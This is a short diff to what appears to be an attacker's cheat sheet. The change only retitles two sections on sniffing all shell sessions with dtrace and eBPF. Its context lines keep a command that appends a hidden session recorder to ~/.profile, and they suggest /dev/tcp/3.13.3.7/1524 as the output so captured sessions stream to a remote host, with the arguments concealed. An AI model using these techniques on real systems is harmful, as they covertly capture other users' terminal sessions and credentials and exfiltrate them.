@@ -1724,7 +1724,7 @@ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
 <a id="dtrace"></a>
-**9.ii Sniff all SHELL sessions with dtrace**
+**9.ii Sniff all SHELL sessions with dtrace - FreeBSD**
 
 Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace *all* sshd processes.
 
@@ -1744,7 +1744,7 @@ Start a dtrace and log to /tmp/.log:
 ```
 
 <a id="bpf"></a>
-**9.iii Sniff all SHELL sessions with eBPF**
+**9.iii Sniff all SHELL sessions with eBPF - Linux**
 
 eBPF allows us to *safely* hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  
 
